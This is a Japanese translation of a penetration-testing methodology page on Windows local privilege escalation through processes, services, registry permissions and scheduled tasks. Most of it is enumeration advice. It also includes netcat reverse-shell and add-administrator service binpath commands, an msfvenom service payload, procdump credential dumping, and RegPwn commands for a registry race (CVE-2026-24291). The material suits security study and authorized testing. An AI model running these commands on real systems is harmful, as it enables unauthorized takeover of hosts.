まず、プロセスを一覧表示して、**プロセスのコマンドラインにパスワードが含まれていないか確認します**。\
**実行中のバイナリを上書きできるか**、またはバイナリのフォルダーへの書き込み権限があるかを確認し、[**DLL Hijacking 攻撃**](dll-hijacking/index.html)を実行できる可能性を調べます。

```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```

常に実行中の[**electron/cef/chromium debuggers**](../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md)がないか確認してください。権限昇格に悪用できる可能性があります。

debugger listenerは短時間しか存在しないことがあるため、受動的なポートスナップショットで見つからなくても、公開されていなかった証拠にはなりません。見つかったlistenerについて、PID、プロセスの所有者、権限の低いユーザーから到達可能かどうかを照合してください。アプリケーション名やdebug flagだけでは、ユーザー間のコード実行が可能だとは判断できません。通常の列挙では受動的な方法を保ち、debuggerコマンドは送信しないでください。

**プロセスのバイナリの権限を確認する**

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
	for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
		icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
	)
)
```

**プロセスのバイナリが配置されているフォルダーのアクセス権を確認する (**[**DLL Hijacking**](dll-hijacking/index.html)**)**

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
	icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```

### Snort dynamic preprocessor ディレクトリ

Snort 2 は、`snort.exe -c <config>` で選択した設定ファイル内で宣言された `dynamicpreprocessor directory` から共有ライブラリを読み込めます。別のアカウントで Snort を実行するスケジュールタスクまたはサービスについて調べる場合は、実際に使用される設定ファイルと、宣言されたモジュールディレクトリの ACL を確認してください。そのディレクトリに自分のトークンでファイルを作成できる場合、タスクまたはサービスが次にモジュールを読み込む際のコード実行につながる可能性があるため、調査候補となります。実行アカウントの実効権限、有効な設定、モジュールの互換性、拒否設定や共有制限を確認してください。ディレクトリが書き込み可能というだけでは、権限昇格が立証されたことにはなりません。[Snort's dynamic-preprocessor documentation](https://www.snort.org/documents/dpx-readme) では、実行時のモジュール読み込みについて説明されています。

### 書き込み可能なドキュメントルートを持つ特権 Web サービス

Windows Apache のインストール環境では、サービスの実行ファイルパスと実行アカウントを、アクティブな `httpd.conf` 内の `DocumentRoot` と照合してください。一般的な XAMPP の構成では、`C:\xampp\apache\conf\httpd.conf` と、設定されているドキュメントルート（多くの場合 `C:\xampp\htdocs`）の ACL を確認します。Apache が `LocalSystem` として実行されている間に、低い権限のユーザーがそのルートにファイルを作成できる場合、サーバー側コードの実行によってホストの権限境界を越えられる可能性があります。サービスが実行中であること、対象のパスが実際に配信されること、およびサーバー側のハンドラーがそのファイル形式を処理することを確認してください。ルートが書き込み可能というだけでは、ファイルを作成できることしか証明できません。書き込みテストを行わずに ACL を確認してください:

```powershell
Get-CimInstance Win32_Service -Filter "Name='Apache2.4'" | Select-Object Name, State, StartName, PathName
Select-String -Path 'C:\xampp\apache\conf\httpd.conf' -Pattern '^\s*DocumentRoot\s+'
icacls 'C:\xampp\htdocs'
```

一般的な WAMP インストールでは、サービスがバージョン付きの `C:\wamp64\bin\apache\apache*\bin\httpd.exe`（32-bit 構成では `C:\wamp\...`）を指し、設定ファイルはその隣の `conf\httpd.conf`、デフォルトのルートは `C:\wamp64\www` または `C:\wamp\www` である場合があります。正確なサービスイメージ、実行ユーザー、実効 `DocumentRoot`（`${INSTALL_DIR}` の展開や virtual-host の上書きを含む）、およびルートの ACL をまとめて確認してください。WAMP ディレクトリが書き込み可能だからといって、Apache が `SYSTEM` として実行されている、あるいは提出したファイルを実行するとは限りません。[Apache は、Windows サービスが設定を選択する方法を説明しています](https://httpd.apache.org/docs/2.4/platform/windows.html#winnt-service)。

### 書き込み可能な IIS ルートとアプリケーションプールのネットワーク ID

IIS では、書き込み可能な物理ディレクトリを `applicationHost.config` 内の**有効なサイト／アプリケーション**に対応付け、設定されたプールとサーバー側の handler を特定してください。配信対象のディレクトリに配置したコードがプールの ID で実行されるのは、IIS がそのファイル形式を処理し、そのルートに到達できる場合に限られます。書き込み可能なディレクトリをコード実行と見なす前に、現在のユーザーが有効な作成権限を持つか、サイトが実行中か、handler とパスごとの上書き設定はどうなっているかを確認してください。

ASP.NET の動的コンパイルについては、アプリケーションのコンパイルディレクトリに生成されるファイルも別途確認が必要です。デフォルトでは、該当する .NET Framework のインストール先にある `Temporary ASP.NET Files` ディレクトリが使われますが、アプリケーションの `<compilation tempDirectory>` で変更できます。[Microsoft は保存場所とアプリケーションごとのサブディレクトリについて説明しており](https://learn.microsoft.com/en-us/previous-versions/aspnet/ms366723%28v%3Dvs.100%29)、[アプリケーションプール間で信頼関係がない場合は、コンパイルディレクトリを分離することを推奨しています](https://learn.microsoft.com/en-us/iis/manage/creating-websites/provisioning-iis-7-sites-for-shared-hosting#configuring-aspnet-temporary-compilation-directories)。低権限のトークンで**特定の**アプリケーションのキャッシュ内にある生成ソースを変更できる場合は、そのアプリケーションがより高い権限の[ワーカープロセス ID](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities)で再コンパイルするかを確認してください。ファイルやディレクトリの ACL だけではコード実行の証明になりません。キャッシュが有効なアプリケーション、実効トークンと ACL、コンパイル設定、プロセス ID、再コンパイルのタイミングを照合してください。読み取り専用でメタデータを確認し、列挙中にコンパイルを発生させたり、キャッシュファイルを変更したりしないでください。

`ApplicationPoolIdentity` または `NetworkService` として構成された IIS プールは、ローカルのトークンが低権限でも、通常はドメインリソースへの認証に**ホストコンピューターのアカウント**を使用します。`LocalSystem` はローカルですでに高い権限を持ち、ネットワーク上でもコンピューターアカウントを使用します。一方、`LocalService` は通常、匿名のネットワーク資格情報を提示します。`SpecificUser` のプールは、構成済みのアカウントを使用します。[Microsoft はこれらの ID の種類](https://learn.microsoft.com/en-us/iis/configuration/system.applicationhost/applicationpools/add/processmodel)と[アプリケーションプールのネットワーク ID](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities)について説明しています。ID 設定が省略されている場合はプールのデフォルトが継承されますが、デフォルトは IIS の世代によって異なるため、プール名から推測せず、実効設定を確認してください。コード実行がコンピューターアカウントのネットワーク ID を持つプールに到達する場合は、**該当するコンピューターの**ディレクトリ権限を評価してください。[DCSync](../active-directory-methodology/dcsync.md) にはドメイン命名コンテキスト上のレプリケーション権限が必要です。マシンアカウントのチケットやホストの役割だけでは、その権限があるとは証明できません。受動的な列挙では、ファイルのアップロード、ネットワーク認証、チケットの要求を行わずに、設定と ACL を確認してください。

ヘルパープロセスを起動する ASP.NET handler を読み取れる場合は、リクエスト由来の値が認証、復号、検証、コマンド構築を通過する経路を追跡してください。デコードしたトークンを `ProcessStartInfo("cmd", "/c ...")` に連結する handler では、shell のメタ文字によってコマンドが変更される可能性があります。[Microsoft は `cmd` の特殊文字について説明しています](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/cmd)。信頼されていない呼び出し元が実際にデコード後の値を制御でき、handler に到達できることを確認してから、実効アプリケーションプール ID または偽装 ID と子プロセスの ID を特定してください。ソースコードの行が読み取れること、localhost の listener、トークン形式の弱点だけでは、特権コマンド実行の証明になりません。受動的な列挙中は、偽造リクエストを送信したりヘルパーを実行したりせずに、ソースとプールの設定を確認してください。

Windows 上の PHP サービスでは、リクエストで制御されたパスを [`include` または `require`](https://www.php.net/manual/en/function.include.php) に渡すと、ワーカープロセスの ID で低権限ユーザーが書き込み可能な PHP ファイルが評価される可能性があります。リクエストが該当する文に到達できること、解決後のパスが低権限ユーザーの変更可能なファイルを指し、ワーカープロセスが読み取れること、適用される PHP のパス制限で include が許可されていること、そしてワーカープロセスが実際により高い権限で実行されていることを確認してください。loopback listener や書き込み可能なファイルだけでは、この一連の条件が成立する証明になりません。受動的な列挙中は endpoint を呼び出さずに、ソース、サービス ID、ファイル ACL を確認してください。

### メモリからのパスワードマイニング

sysinternals の **procdump** を使うと、実行中のプロセスのメモリダンプを作成できます。FTP などのサービスでは、**資格情報がメモリ内に平文で存在する**ことがあります。メモリをダンプして資格情報を読み取ってみてください。

```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```

### 安全でない GUI アプリ

**SYSTEM として実行されるアプリケーションでは、ユーザーが CMD を起動したり、ディレクトリを参照したりできる場合があります。**

例: 「Windows ヘルプとサポート」(Windows + F1) で「command prompt」を検索し、「クリックしてコマンド プロンプトを開く」をクリックします。

### 特権アカウントによるプロジェクトファイルのインポート

低権限ユーザーが書き込める drop directory からプロジェクトを自動的に開くアプリケーションでは、インポーターのアカウントのもとで入力の信頼境界を越えます。**書き込み可能な正確なパス**、それを開くプロセスまたはタスク、その実効 ID、パーサーのビルドを確認してください。[過去の Ghidra のプロジェクトを開く/復元する際の問題](https://github.com/NationalSecurityAgency/ghidra/issues/71)では、プロジェクトメタデータ内の XML 外部エンティティが許可されていました。Windows でネットワークエンティティを使用すると、[アウトバウンド SMB および NTLM ポリシー](https://learn.microsoft.com/en-us/windows-server/storage/file-server/smb-ntlm-blocking)によっては、インポートを実行するアカウントから認証が行われる可能性があります。これは認証情報漏えいにつながる手掛かりであり、直ちに管理者アクセスを得られるわけではありません。応答を利用するには、別途、認可された経路または脆弱な経路が必要です。また、現行ビルドについては実際のパッチ適用状況を確認してください。受動的な列挙中に細工したプロジェクトを開かず、インポートの手順と ACL を調査してください。

## Services

Service Control Manager (SCM) オブジェクトの [`SC_MANAGER_CREATE_SERVICE` 権限](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights)は、既存サービスに対する権限とは別です。この権限に対する読み取り専用の [`OpenSCManager` アクセス要求](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-openscmanagerw)が成功しても、それは調査の手掛かりであって、新しいサービスを実行できる証拠ではありません。[`CreateService` はハンドルを返します](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-createservicew)。このハンドルには作成時に要求したサービスアクセス権が付与されます。後でサービスを再度開く場合は別途アクセスチェックが行われるため、元のハンドルを使える場合でも失敗する可能性があります。実効ローカルまたはリモートトークン、付与されたハンドルの権限、サービスアカウント、起動ポリシー、実行ファイルのパスをそれぞれ確認してください。受動的な列挙中にサービスを作成したり、起動したりしないでください。

リモートからサービスをインストールする経路については、SCM の権限を、対象上の共有に対する**同じネットワークログオン**での書き込み権限、その共有の基盤となる NTFS ACL、サービスアカウントが実行可能なローカル実行ファイルのパスと照合してください。異常に広い SCM 権限とファイル配置の経路の両方があれば、非管理者アカウントでもこの境界を越えられる可能性があります。管理共有が必須というわけではありません。共有への書き込み権限だけでも、SCM のサービス作成権限の手掛かりだけでも、新しいサービスをより高い権限で起動できるとは判断できません。

既存のサービスは、起動時、シャットダウン時、または別のライフサイクルイベント時に、`ImagePath` に指定されていないヘルパー実行ファイルを呼び出すことがあります。ヘルパー名が低権限ユーザーの書き込み可能なディレクトリに解決され、サービスがより高い権限で実行される場合、欠落しているヘルパーファイルが条件付きで置き換え候補になることがあります。**実際のサービスコード、または文書化されたヘルパーの呼び出し**、解決される実行ファイルのパスと検索順序、ディレクトリの作成権限、サービス ID、利用可能なライフサイクルトリガーを確認してください。サービスディレクトリが書き込み可能であることや、ファイルが欠落していることだけでは、サービスがそのファイルを読み込む証拠になりません。受動的な調査ではサービスを起動または停止しないでください。

既存のサービスでは、[`SERVICE_START` により `StartService` に引数を渡せます](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-startservicew)。これは [`SERVICE_CHANGE_CONFIG`](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights)とは別の権限です。起動権限を単なる制御権限以上のものとみなす前に、サービスのコードまたは文書化されたインターフェースを確認してください。呼び出し元が選択した引数をログまたはエクスポート先のパスとして使用する場合は、サービス ID、引数から書き込みまでの正確な処理、パスの制限、**作成されるファイル**の権限を確認してください。保護されたディレクトリへの書き込みが権限昇格につながるのは、そのファイルを受け入れる特権コンシューマーまたはローダーが別途存在する場合だけです。書き込み可能なログや起動権限だけでは不十分です。受動的なインベントリ調査ではサービスを起動したり、テストファイルを作成したりしないでください。

NSClient++ 監視エージェントでは、読み取り可能な `nsclient.ini` は**設定を調査する手掛かり**です。Web 認証情報が含まれている可能性があり、`boot.ini` によって設定の参照先が別の場所に変更されることもあります。実際のサービスアカウント、WEB リスナーとアクセス ポリシー、認証されたロールで設定またはスクリプトを変更できるかを確認してください。特権実行にはさらに、`CheckExternalScripts` (または有効な別の実行経路)、コマンドの登録または変更に対する実効権限、そのコマンドをサービス ID で実行するトリガーが必要です。ループバック専用のリスナーでもローカルユーザーから到達できる場合がありますが、ファイルパス、パスワード、またはリスナーだけでは、それらの権限があるとは判断できません。受動的な列挙中は、秘密情報を表示したり、Web API を呼び出したりせずに、メタデータと権限を確認してください。[NSClient++ のファイル構成](https://nsclient.org/docs/concepts/file-layout/)、[Web とスクリプトのセキュリティガイダンス](https://nsclient.org/docs/setup/securing/)、[外部スクリプトの設定](https://nsclient.org/docs/reference/check/CheckExternalScripts/)を参照してください。

`ImagePath` が `nssm.exe` のサービスでは、サービスの実際の実行アカウントと、`HKLM\SYSTEM\CurrentControlSet\Services\<name>\Parameters\Application` の値を確認してください。[NSSM は子アプリケーションをここに保存します](https://git.nssm.cc/nssm/nssm/src/96e7f4484a3dc962482c240909fd52b0e0226a60/registry.h)。`AppDirectory` は設定された作業ディレクトリです。ラッパーの権限だけでサービス境界全体を判断する前に、子の実行ファイルとその親ディレクトリの ACL を確認してください。その子が公開するローカル WCF または SOAP エンドポイントは、別途調査すべき手掛かりです。低権限ユーザーからリスナーに到達できること、該当する操作がそのユーザーの入力を受け入れること、サービスの子プロセスがより高い権限で安全でない操作を実行することを確認してください。サービスアカウント、エンドポイント URL、書き込み可能なパスのいずれも、それだけでは権限昇格の証拠になりません。受動的な列挙中にサービス操作を呼び出さないでください。

カスタム WCF 操作では、呼び出し元が制御する文字列が PowerShell runspace に渡される箇所を追跡してください。[`Pipeline.Commands.AddScript` はスクリプトテキストを追加します](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.commandcollection.addscript)、[`Pipeline.Invoke` はパイプラインを実行します](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.pipeline.invoke)。[Windows トランスポート資格情報を使用する `netTcpBinding`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/wcf/transport-of-nettcpbinding)はクライアントを認証しますが、その**特定の**操作を呼び出す権限と runspace の実効 ID は別途確認する必要があります。低権限の呼び出し元の入力から、より高いサービス ID で実行される `AddScript` への経路は、コード実行の境界です。リスニングポート、認証済みクライアント、または無関係なアセンブリ内の未使用メソッドだけでは証拠になりません。列挙中にエンドポイントを呼び出さず、デプロイ済みサービス、コントラクト、認可、偽装設定を静的に調査してください。

Service Triggers により、特定の条件 (名前付きパイプ/RPC エンドポイントのアクティビティ、ETW イベント、IP の利用可能状態、デバイスの接続、GPO の更新など) に応じて Windows がサービスを起動できます。SERVICE_START 権限がなくても、トリガーを発火させて特権サービスを起動できる場合があります。列挙と有効化の手法はこちらを参照してください。

-
{{#ref}}
service-triggers.md
{{#endref}}

### Visual Studio 診断コレクターサービス

C/C++ ツールを含む Visual Studio のインストール環境には、`LocalSystem` として実行されるよう設定された診断サービス `VSStandardCollectorService150` が含まれる場合があります。[CVE-2024-20656](https://www.mdsec.co.uk/2024/01/cve-2024-20656-local-privilege-escalation-in-vsstandardcollectorservice150-service/) では、junction と object-manager-link の競合を利用して、サービス DACL のリセット先をリダイレクトしました。実証された権限昇格には、利用可能な Visual Studio Setup WMI Provider MSI 修復経路と、`C:\ProgramData\Microsoft\VisualStudio\SetupWMI\MofCompiler.exe` というターゲットも必要でした。このコンポーネントは 2024 年 1 月に修正されました。

受動的なトリアージでは、そのサービスのアカウントとバイナリパスを調べ、Setup WMI コンパイラのパスが存在するかを確認し、インストール済みコンポーネントのパッチ適用状況を検証してください。サービスエントリ、Visual Studio の製品バージョン、コンパイラファイルのいずれも、それだけではホストが脆弱である証拠になりません。サービスを起動したり、修復を実行したりせずに調査できます。

サービスの一覧を取得するには:

```bash
net start
wmic service list brief
sc query
Get-Service
```

### 権限

**sc** を使ってサービスの情報を取得できます。

```bash
sc qc <service_name>
```

各サービスに必要な権限レベルを確認するため、_Sysinternals_ のバイナリ **accesschk** を用意しておくことをお勧めします。

```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```

「Authenticated Users」がいずれかのサービスを変更できるか確認することをおすすめします。

```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```

[XP 用の accesschk.exe はこちらからダウンロードできます](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### サービスを有効にする

次のエラーが発生した場合（たとえば SSDPSRV の場合）:

_システム エラー 1058 が発生しました。_\
_サービスを開始できません。無効になっているか、関連付けられた有効なデバイスがないためです。_

次のコマンドで有効にできます。

```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```

**（XP SP1 の場合）サービス upnphost が動作するには SSDPSRV に依存することに注意してください**

**この問題の別の回避策**は、次を実行することです：

```
sc.exe config usosvc start= auto
```

### **サービスバイナリのパスを変更**

「Authenticated users」グループがサービスに対する **SERVICE_ALL_ACCESS** を持つシナリオでは、サービスの実行可能バイナリを変更できます。**sc** を変更して実行するには：

```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```

### サービスの再起動

```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```

権限は、次のようなさまざまな権限を通じて昇格できます。

- **SERVICE_CHANGE_CONFIG**: サービスバイナリの再設定を許可します。
- **WRITE_DAC**: 権限の再設定を可能にし、サービス設定を変更できるようにします。
- **WRITE_OWNER**: 所有権の取得と権限の再設定を可能にします。
- **GENERIC_WRITE**: サービス設定を変更する権限を継承します。
- **GENERIC_ALL**: 同様に、サービス設定を変更する権限を継承します。

この脆弱性の検出と悪用には、_exploit/windows/local/service_permissions_ を利用できます。

### サービスバイナリの脆弱な権限

サービスが **`LocalSystem`**、**`LocalService`**、**`NetworkService`**、または特権を持つドメインアカウントとして実行されていて、**低権限ユーザーがサービス EXE またはその親フォルダを変更できる**場合、**バイナリを置き換えてサービスを再起動する**ことで、サービスを乗っ取れることがよくあります。

**サービスが実行するバイナリを変更できるか**、またはバイナリの格納フォルダに**書き込み権限があるか**を確認してください（[**DLL Hijacking**](dll-hijacking/index.html)）**。**\
**wmic**（system32 にはありません）を使えばサービスが実行するすべてのバイナリを取得でき、**icacls** を使って権限を確認できます。

```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```

また、**sc** と **icacls** も使用できます：

```bash
sc qc <service_name>
icacls "C:\path\to\service.exe"

sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```

**`Everyone`**、**`BUILTIN\Users`**、または **`Authenticated Users`** に付与された危険な ACL を探します。特に、サービス実行ファイルまたはその格納ディレクトリに対する **`(F)`**、**`(M)`**、**`(W)`** に注意してください。実用的な悪用手順は次のとおりです。<sup>[[27]](#references)</sup>

1. `sc qc <service_name>` でサービスアカウントと実行ファイルのパスを確認します。
2. `icacls <path>` でバイナリが書き込み可能か確認します。
3. サービスバイナリを payload または有効な悪意あるサービスバイナリに置き換えます。
4. `sc stop <service_name> && sc start <service_name>` でサービスを再起動します（または再起動／サービスのトリガーを待ちます）。

自動チェックに便利なツール：<sup>[[28]](#references)</sup>

```powershell
. .\PowerUp.ps1
Get-ModifiableServiceFile -Verbose

SharpUp.exe audit ModifiableServiceBinaries
. .\PrivescCheck.ps1
Invoke-PrivescCheck -Extended -Audit
```

> サービスを通常のユーザーが再起動できない場合は、起動時に自動的に開始されるか、障害時に再起動するアクションが設定されているか、またはそのサービスを使用するアプリケーションによって間接的に起動できるかを確認してください。

### サービスレジストリの変更権限

サービスレジストリを変更できるかどうかを確認してください。\
サービスレジストリに対する**権限**は、次のように**確認**できます。

```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```

**Authenticated Users** または **NT AUTHORITY\INTERACTIVE** が、特定のサービスキーに対して書き込み可能なレジストリ権限を持つか確認してください。ACL エントリがあるだけでは、実効アクセスが可能とは限りません。拒否エントリ、現在のトークン、継承された権限も考慮する必要があります。レジストリキーの権限は、サービスオブジェクトの `SERVICE_CHANGE_CONFIG` および `SERVICE_START` 権限とは別です。権限昇格にはさらに、利用可能なサービス構成フィールド、サービスを起動する方法、より高い権限を持つサービス ID が必要です。Microsoft の[レジストリキーの権限](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-key-security-and-access-rights)と[サービスのアクセス権に関するリファレンス](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights)を参照してください。

実行されるバイナリの Path を変更するには:

```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```

### Registry symlink race による任意の HKLM value write（ATConfig）

一部の Windows アクセシビリティ機能はユーザーごとの **ATConfig** キーを作成し、後に **SYSTEM** プロセスがその内容を HKLM のセッションキーにコピーします。Registry の **symbolic link race** によって、この特権書き込みを **任意の HKLM パス** にリダイレクトし、任意の HKLM **value write** を可能にできます。<sup>[[18]](#references)</sup>

主な場所（例：スクリーン キーボード `osk`）:

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs` には、インストール済みのアクセシビリティ機能が一覧表示されます。
- `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>` には、ユーザーが制御できる設定が保存されます。
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>` は、ログオンやセキュアデスクトップへの遷移時に作成され、ユーザーが書き込み可能です。

悪用の流れ（CVE-2026-24291 / ATConfig）:

1. SYSTEM に書き込ませたい値を **HKCU ATConfig** に設定します。
2. セキュアデスクトップへのコピーをトリガーします（例：**LockWorkstation**）。これにより AT broker の処理が開始されます。
3. **race に勝つ**ため、`C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml` に **oplock** を設定します。oplock が発動したら、**HKLM Session ATConfig** キーを、保護された HKLM の対象パスを指す **registry link** に置き換えます。
4. SYSTEM が攻撃者の指定した値を、リダイレクト先の HKLM パスに書き込みます。

任意の HKLM value write が可能になったら、service の設定値を上書きして LPE に移行します:

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath`（EXE / コマンドライン）
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll`（DLL）

通常のユーザーが起動できる service（例：**`msiserver`**）を選び、書き込み後に起動します。**注:** 公開されている exploit の実装では、race の一環としてワークステーションをロックします。

ツールの例（RegPwn BOF / standalone）:<sup>[[19]](#references)</sup>

```bash
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```

### Services registry の AppendData/AddSubdirectory permissions

レジストリに対するこの permission を持っている場合、**このレジストリの下にサブレジストリを作成できます**。Windows services の場合、**任意のコードを実行するのに十分です:**


{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

実行ファイルのパスが引用符で囲まれていない場合、Windows はスペースまでの部分をすべて実行しようとします。

たとえば、パスが _C:\Program Files\Some Folder\Service.exe_ の場合、Windows は次を実行しようとします:

```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```

組み込みの Windows サービスに属するものを除き、引用符で囲まれていないサービスパスをすべて一覧表示します。

```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
	for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
		echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
	)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```

**metasploitを使ってこの脆弱性を検出・悪用できます:** `exploit/windows/local/trusted\_service\_path` metasploitを使ってサービスバイナリを手動で作成できます:

```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```

### 回復アクション

Windows では、サービスが失敗した場合に実行するアクションをユーザーが指定できます。この機能は、バイナリを指すように設定できます。そのバイナリを置き換えられる場合、権限昇格が可能なことがあります。詳しくは[公式ドキュメント](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>)を参照してください。

## スケジュールされたタスクのスクリプト対象

有効なタスクが `.bat` または `.cmd` ファイルを指定して `cmd.exe /c` を実行する場合、`cmd.exe` だけでなく、**アクションの引数**で指定されたスクリプトも確認してください。PowerShell の `-File` など、インタープリターに明示的なファイル引数を指定する場合も同様です。スケジュールされたバッチファイルに PowerShell の `-File` 呼び出しが直接記述されている場合は、指定されたスクリプトの ACL も調査してください。変数、条件分岐、シェルの連結がある場合は、手作業で追跡する必要があります。呼び出し元が書き込み可能なスクリプトまたは親ディレクトリは、設定されたタスクのプリンシパルが呼び出し元と異なり、かつタスクが実際にそのアクションを実行する場合に限り、アカウントをまたぐ実行の手がかりとなります。スクリプトでは追記のみ可能な ACL も関係する場合がありますが、先行する `exit` やその他の制御フローによって、追記した行が実行されないことがあります。権限昇格と判断する前に、実効 ACL、[タスクの実行コンテキスト](https://learn.microsoft.com/en-us/windows/win32/taskschd/security-contexts-for-running-tasks)、作業ディレクトリ、トリガー、アプリケーション制御ポリシーを確認してください。インベントリ作成時にスクリプトを変更したり、タスクを開始したりしてはいけません。

## アクセス可能なファイルの名前付きストリーム

NTFS では、読み取り可能なファイルに名前付き `:$DATA` ストリームが含まれていることがあり、その内容は通常のディレクトリ一覧には表示されません。アクセス可能なバックアップファイルや構成ファイルのうち、関連性の高い少数のファイルについては、内容を開く前にストリームの**名前とサイズ**を確認してください。Windows では、[`FindFirstStreamW` / `FindNextStreamW`](https://learn.microsoft.com/en-us/windows/win32/fileio/file-streams) と PowerShell の [`Get-Item -Stream *`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-item) で確認できます。秘密情報を示唆するストリーム名は、あくまで手がかりにすぎません。ファイルへの実効読み取りアクセス、ファイルシステムがストリームをサポートしているか、ストリームに利用可能な認証情報が含まれているか、そしてその認証情報が実際にどのアカウントとして認証されるかを確認してください。定期的な列挙では、再帰的なストリームのスキャンやストリーム内容の表示を避けてください。

## スケジュールされた Windows Driver Kit ヘルパーの入力ファイル

